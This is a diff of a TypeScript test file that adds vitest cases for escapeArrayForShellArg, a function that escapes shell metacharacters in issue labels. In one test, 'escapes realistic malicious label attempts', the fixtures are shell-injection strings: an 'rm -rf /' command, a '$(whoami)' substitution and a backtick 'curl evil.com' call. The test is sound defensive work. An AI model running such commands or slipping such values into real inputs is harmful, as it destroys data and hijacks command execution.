@@ -1,5 +1,10 @@
 import { describe, it, expect } from "vitest";
-import { wrapUserContent, wrapRepoConfiguration, escapeForShellArg } from "./sanitize";
+import {
+  wrapUserContent,
+  wrapRepoConfiguration,
+  escapeForShellArg,
+  escapeArrayForShellArg,
+} from "./sanitize";
 
 describe("wrapUserContent", () => {
   it("wraps simple content in delimiters", () => {
@@ -244,5 +249,43 @@ describe("escapeForShellArg", () => {
     expect(escapeForShellArg("Add new feature")).toBe("Add new feature");
     expect(escapeForShellArg("Fix bug #42")).toBe("Fix bug #42");
     expect(escapeForShellArg("feat: add login")).toBe("feat: add login");
+  });
+});
+
+describe("escapeArrayForShellArg", () => {
+  it("escapes each element and joins with commas", () => {
+    const labels = ["bug", "high-priority", "needs-review"];
+    const result = escapeArrayForShellArg(labels);
+
+    expect(result).toBe("bug,high-priority,needs-review");
+  });
+
+  it("escapes shell metacharacters in each element", () => {
+    const labels = ['label"with"quotes', "label$with$dollar", "label`with`backtick"];
+    const result = escapeArrayForShellArg(labels);
+
+    expect(result).toBe('label\\"with\\"quotes,label\\$with\\$dollar,label\\`with\\`backtick');
+  });
+
+  it("returns empty string for empty array", () => {
+    const result = escapeArrayForShellArg([]);
+
+    expect(result).toBe("");
+  });
+
+  it("handles single element array", () => {
+    const result = escapeArrayForShellArg(["bug"]);
+
+    expect(result).toBe("bug");
+  });
+
+  it("escapes realistic malicious label attempts", () => {
+    const maliciousLabels = ['"; rm -rf /', "$(whoami)", "`curl evil.com`"];
+    const result = escapeArrayForShellArg(maliciousLabels);
+
+    expect(result).not.toMatch(/(?<!\\)"/);
+    expect(result).not.toMatch(/(?<!\\)\$/);
+    expect(result).not.toMatch(/(?<!\\)`/);
+    expect(result).toBe('\\"; rm -rf /,\\$(whoami),\\`curl evil.com\\`');
   });
 });
